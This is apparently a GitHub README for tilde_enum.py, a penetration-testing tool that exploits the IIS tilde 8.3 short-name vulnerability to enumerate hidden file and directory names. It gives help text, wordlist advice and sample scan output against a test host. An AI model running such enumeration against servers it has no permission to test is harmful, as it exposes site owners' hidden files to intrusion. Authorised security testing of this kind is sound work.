iis_tilde_enum
==============

Takes a URL and then exploits the **IIS tilde 8.3 enumeration vuln** and tries to get you full file names.

You feed this script a URL and also a word list of potential file names. The script will look up the file
roots in your word list and then try them with appropriate extensions.

For word lists, the [fuzzdb](https://code.google.com/p/fuzzdb/) word lists are pretty good. We sometimes use the
[raft-small-words-lowercase.txt](https://code.google.com/p/fuzzdb/source/browse/trunk/discovery/PredictableRes/raft-small-words-lowercase.txt)
(or large or medium) for this work.

This is not a directory enumerator (i.e., tries all words in a list against a web server). It will only find
directories that have names longer than 8 characters (since only then will they have 8.3 names and be recognized
by the vulnerability). You should still try to enumerate directories using a word list and
[DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project) or Burp Intruder or something.

Just as a note: on Windows computers you can view 8.3 names in the command prompt window by using the
`dir /x` command. One of the columns will be the 8.3 name (if there is one).
You can find the converting rules for 8.3 filename on [wikipedia](http://en.wikipedia.org/wiki/8.3_filename#How_to_convert_a_long_filename_to_a_short_filename)

Always enjoy feedback and suggestions.


Help
----
<pre>$  ./tilde_enum.py -h
usage: tilde_enum.py [-h] [-d PATH_WORDLISTS] [-e PATH_EXTS] [-f] [-g]
                     [-o OUT_FILE] [-p PROXY] [-u URL] [-v VERBOSE_LEVEL]
                     [-w WAIT] [--limit-ext LIMIT_EXTENSION]
                     [--resume RESUME_STRING]

Exploits and expands the file names found from the tilde enumeration vuln

optional arguments:
  -h, --help            show this help message and exit
  -d PATH_WORDLISTS     Path of wordlists file
  -e PATH_EXTS          Path of extensions file
  -f                    Force testing even if the server seems not vulnerable
  -g                    Enable Google keyword suggestion to enhance wordlists
  -o OUT_FILE           Filename to store output
  -p PROXY              Use a proxy host:port
  -u URL                URL to scan
  -v VERBOSE_LEVEL      verbose level of output (0~2)
  -w WAIT               time in seconds to wait between requests
  --limit-ext LIMIT_EXTENSION
                        Enumerate for given extension only
  --resume RESUME_STRING
                        Resume from a given name (length lt 6)
</pre>


Sample Output
-------------
<pre>
$  ./tilde_enum.py -u "http://iis/" -w 0.5 -o output/result.txt --resume=announ
[-]  Testing with dummy file request http://iis/Uxd9ckrVGZMmp.htm
[-]    URLNotThere -> HTTP Code: 404, Response Length: 1379
[-]  Testing with user-submitted http://iis/
[-]    URLUser -> HTTP Code: 200, Response Length: 1914
[-]  Resume from "announ"... characters before this will be ignored.
[-]  User-supplied delay detected. Waiting 0.5 seconds between HTTP requests.
[+]  The server is reporting that it is IIS (Microsoft-IIS/6.0).
[+]  The server is vulnerable to the IIS tilde enumeration vulnerability..
[+]  Found file:  announ~1.htm
[+]  Found directory:  aspnet~1/
[+]  Found file:  cate-v~1.asp
[+]  Found file:  cate-v~2.asp
[*]  Testing: http://iis/c9*~1*/.aspx
[!]  Stop tilde enumeration manually. Try wordlist enumeration from current findings now...
[+] Total requests sent: 337

---------- OUTPUT START ------------------------------
[+] Raw results:
http://iis/announ~1.htm
http://iis/aspnet~1/
http://iis/cate-v~1.asp
http://iis/cate-v~2.asp

[+] Existing files found: 2
http://iis/announcement.htm
http://iis/cate-visitor.asp

[+] Existing Directories found: 1
http://iis/aspnet_client/
---------- OUTPUT COMPLETE ---------------------------
</pre>
